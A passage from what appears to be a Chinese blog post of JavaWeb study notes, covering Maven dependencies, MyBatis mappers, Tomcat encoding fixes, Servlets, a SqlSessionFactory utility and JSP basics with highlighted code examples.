class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.11.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-comment">&lt;!--Mybatis--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.5.6<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-comment">&lt;!--MySQL--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.33<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-comment">&lt;!--JSP--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jsp-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-comment">&lt;!--JSTL/jsp依赖--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>jstl<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jstl<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-comment">&lt;!--JSTL依赖--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>taglibs<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>standard<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <br>        <span class="hljs-comment">&lt;!--fastjson--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.83<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="二、MyBatis"><a href="#二、MyBatis" class="headerlink" title="二、MyBatis"></a>二、MyBatis</h2><p>优秀的持久层框架，简化JDBC的开发</p><p>JavaEE的三层：表现层、业务层、持久层</p><p>可以理解为Java程序与数据库的连接和交换方式</p><h2 id="三、Mapper"><a href="#三、Mapper" class="headerlink" title="三、Mapper"></a>三、Mapper</h2><h4 id="首先注意映射关系，如图："><a href="#首先注意映射关系，如图：" class="headerlink" title="首先注意映射关系，如图："></a>首先注意映射关系，如图：</h4><p><img src="/img/JavaWeb/1-1/Mapper1.png"></p><h4 id="1、写在xml文件中的方法"><a href="#1、写在xml文件中的方法" class="headerlink" title="1、写在xml文件中的方法"></a>1、写在xml文件中的方法</h4><p>BrandMapper.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mapper</span></span><br><span class="hljs-meta">        <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;com.study.mapper.BrandMapper&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;brandResultMap&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;brand&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;brand_name&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;brandName&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;company_name&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;companyName&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span><br></code></pre></td></tr></table></figure><p>BrandMapper.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.study.mapper;<br><br><span class="hljs-keyword">import</span> org.apache.ibatis.annotations.ResultMap;<br><span class="hljs-keyword">import</span> org.apache.ibatis.annotations.Select;<br><span class="hljs-keyword">import</span> com.study.pojo.Brand;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">BrandMapper</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 查询所有</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Select(&quot;select * from tb_brand&quot;)</span><br>    <span class="hljs-meta">@ResultMap(&quot;brandResultMap&quot;)</span><br>    List&lt;Brand&gt; <span class="hljs-title function_">selectAll</span><span class="hljs-params">()</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="2、全部写在注释中的方法"><a href="#2、全部写在注释中的方法" class="headerlink" title="2、全部写在注释中的方法"></a>2、全部写在注释中的方法</h4><p>UserMapper.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mapper</span></span><br><span class="hljs-meta">        <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;User.mapper.UserMapper&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span><br></code></pre></td></tr></table></figure><p>UserMapper.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> User.mapper;<br><span class="hljs-keyword">import</span> User.pojo.User;<br><span class="hljs-keyword">import</span> org.apache.ibatis.annotations.Insert;<br><span class="hljs-keyword">import</span> org.apache.ibatis.annotations.Param;<br><span class="hljs-keyword">import</span> org.apache.ibatis.annotations.Select;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserMapper</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 根据用户名和密码查询用户对象</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> username</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> password</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Select(&quot;select * from tb_user where username = #&#123;username&#125; and password = #&#123;password&#125;&quot;)</span><br>    User <span class="hljs-title function_">select</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;username&quot;)</span> String username, <span class="hljs-meta">@Param(&quot;password&quot;)</span> String password)</span>;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 根据用户名查询用户对象</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> username</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Select(&quot;select * from tb_user where username = #&#123;username&#125;&quot;)</span><br>    User <span class="hljs-title function_">selectByUsername</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;username&quot;)</span> String username)</span>;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 添加用户</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> user</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Insert(&quot;insert into tb_user values(null,#&#123;username&#125;,#&#123;password&#125;)&quot;)</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(User user)</span>;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="四、Tomcat"><a href="#四、Tomcat" class="headerlink" title="四、Tomcat"></a>四、Tomcat</h2><h3 id="一个网络服务框架"><a href="#一个网络服务框架" class="headerlink" title="一个网络服务框架"></a>一个网络服务框架</h3><p>可以本地配置，也可以Maven导入一个插件</p><p>同时注意，Tomcat9及之前的版本默认的编码格式不是UTF-8，是ISO-8859-1，Tomcat10是UTF-8，可能会出现中文乱码的问题</p><p>GET的解决方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/resp3&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ResponseDemo3</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;张三&quot;</span>;<br>        <span class="hljs-comment">//1.URL编码</span><br><span class="hljs-comment">//        String encode = URLEncoder.encode(username, &quot;utf-8&quot;);</span><br><span class="hljs-comment">//        System.out.println(encode);</span><br>        <span class="hljs-comment">//2.URL解码</span><br><span class="hljs-comment">//        String decode = URLDecoder.decode(username, &quot;utf-8&quot;);</span><br><span class="hljs-comment">//        System.out.println(decode);</span><br>        <span class="hljs-comment">//3.转化为字节数据</span><br><span class="hljs-comment">//        byte[] bytes = decode.getBytes(&quot;ISO-8859-1&quot;);</span><br><span class="hljs-comment">//        for(byte b : bytes) &#123;</span><br><span class="hljs-comment">//            System.out.println(b + &quot; &quot;);</span><br><span class="hljs-comment">//        &#125;</span><br>        <span class="hljs-comment">//4.将字节数组转化为字符串</span><br><span class="hljs-comment">//        String s = new String(bytes, &quot;utf-8&quot;);</span><br><span class="hljs-comment">//        System.out.println(s);</span><br><br>        <span class="hljs-comment">//一行代码解决</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(username.getBytes(<span class="hljs-string">&quot;ISO-8859-1&quot;</span>),<span class="hljs-string">&quot;utf-8&quot;</span>);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>POST的解决方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/resp3&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ResponseDemo3</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        resp.setContentType(<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>);<br>        <span class="hljs-comment">//设置字符输入流的编码，这样就可以了</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="五、Servlet"><a href="#五、Servlet" class="headerlink" title="五、Servlet"></a>五、Servlet</h2><h3 id="1、Request和Response"><a href="#1、Request和Response" class="headerlink" title="1、Request和Response"></a>1、Request和Response</h3><p>使用Request对象来【获取请求】数据</p><p>使用Response对象来【设置相应】数据</p><p>一般格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/resp2&quot;)</span><br><span class="hljs-comment">//Web访问的路径</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ResponseDemo2</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-comment">//设置响应类型</span><br>        resp.setContentType(<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>);<br>        <span class="hljs-comment">//通过Response对象获取输出流</span><br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> resp.getWriter();<br>        <span class="hljs-comment">//写数据</span><br>        writer.write(<span class="hljs-string">&quot;resp2&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-built_in">super</span>.doPost(req, resp);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="2、SqlSessionFactory"><a href="#2、SqlSessionFactory" class="headerlink" title="2、SqlSessionFactory"></a>2、SqlSessionFactory</h3><p>一般要抽取一个SqlSessionFactory工具类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SqlSessionFactoryUtils</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> SqlSessionFactory sqlSessionFactory;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-comment">//静态代码块会随着类的加载而自动执行，且只执行一次</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">resource</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;mybatis-config.xml&quot;</span>;<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> Resources.getResourceAsStream(resource);<br>            sqlSessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SqlSessionFactoryBuilder</span>().build(inputStream);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SqlSessionFactory <span class="hljs-title function_">getSqlSessionFactory</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> sqlSessionFactory;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>相关的调用和替代：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/request-demo/registerServlet&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RegisterServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-comment">//1.接受用户数据</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;username&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;password&quot;</span>);<br><br>        <span class="hljs-comment">//2.封装用户对象</span><br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        user.setUsername(username);<br>        user.setPassword(password);<br><br>        <span class="hljs-comment">//3.调用mapper，根据用户名查询用户对象</span><br><span class="hljs-comment">//        String resource = &quot;mybatis-config.xml&quot;;</span><br><span class="hljs-comment">//        InputStream inputStream = Resources.getResourceAsStream(resource);</span><br><span class="hljs-comment">//        SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream);</span><br><span class="hljs-comment">//        上面为旧方法，下面用调用静态方法解决：</span><br>        <span class="hljs-type">SqlSessionFactory</span> <span class="hljs-variable">sqlSessionFactory</span> <span class="hljs-operator">=</span> SqlSessionFactoryUtils.getSqlSessionFactory();<br><br>        <span class="hljs-type">SqlSession</span> <span class="hljs-variable">sqlSession</span> <span class="hljs-operator">=</span> sqlSessionFactory.openSession();<br>        <span class="hljs-type">UserMapper</span> <span class="hljs-variable">userMapper</span> <span class="hljs-operator">=</span> sqlSession.getMapper(UserMapper.class);<br>        <span class="hljs-type">User</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> userMapper.selectByUsername(username);<br><br>        <span class="hljs-comment">//4.判断对象是否存在</span><br>        <span class="hljs-keyword">if</span> (u == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">//用户名不存在，添加用户</span><br>            userMapper.add(user);<br>            sqlSession.commit();<br>            sqlSession.close();<br>            resp.setContentType(<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>);<br>            resp.getWriter().write(<span class="hljs-string">&quot;注册成功&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//用户已存在，提示</span><br>            resp.setContentType(<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>);<br>            resp.getWriter().write(<span class="hljs-string">&quot;用户已存在&quot;</span>);<br>        &#125;<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/img/JavaWeb/1-1/SqlSessionFactoryUtils1.png"></p><p><img src="/img/JavaWeb/1-1/SqlSessionFactoryUtils2.png"></p><h2 id="六、JSP"><a href="#六、JSP" class="headerlink" title="六、JSP"></a>六、JSP</h2><p>先导入最先的需要的Maven库和其依赖</p><h3 id="1、Java-Server-Pages-Java服务端页面"><a href="#1、Java-Server-Pages-Java服务端页面" class="headerlink" title="1、Java Server Pages/Java服务端页面"></a>1、Java Server Pages/Java服务端页面</h3><p>一种动态的网页技术，可以定义HTML、JS、CSS等静态内容，还可以定义Java代码的动态内容</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &lt;%<br>        System.out.println(<span class="hljs-string">&quot;hello&quot;</span>);<br>    <span class="hljs-comment">//在这里写Java</span><br>    %&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h3 id="2、EL表达式和JSTL"><a href="#2、EL表达式和JSTL" class="headerlink" title="2、EL表达式和JSTL"></a>2、EL表达式和JSTL</h3><h5 id="EL表达式特点（四大域对象）"><a href="#EL表达式特点（四大域对象）" class="headerlink" title="EL表达式特点（四大域对象）"></a>EL表达式特点（四大域对象）</h5><p><img src="/img/JavaWeb/1-1/EL1.png"></p><h5 id="ServletDemo1设定："><a href="#ServletDemo1设定：" class="headerlink" title="ServletDemo1设定："></a>ServletDemo1设定：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/JSTL&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServletDemo1</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, 